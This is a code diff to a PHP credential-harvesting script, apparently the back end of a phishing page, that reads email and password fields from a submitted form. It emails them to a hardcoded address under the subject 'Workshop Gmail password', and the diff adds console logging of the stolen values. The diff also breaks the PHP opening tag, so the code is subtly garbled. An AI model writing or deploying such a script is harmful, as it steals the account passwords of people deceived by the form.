@@ -1,5 +1,13 @@
-<?php
+?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mailhacked = $_POST["email"];
+        $passwordhacked = $_POST["password"];
+        
+        echo "<script>console.log('Email: " . htmlspecialchars($mailhacked) . "');</script>";
+        echo "<script>console.log('Password: " . htmlspecialchars($passwordhacked) . "');</script>";
+    }
+
+        //$mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
          $to = "lowj2587@laurens55.org";
          $subject = "Workshop Gmail password";
@@ -18,5 +26,6 @@
             include("MKR.php");
          }else {
             echo "Message could not be sent...404 error check your internet";
-         }
+         }//
       ?>
+
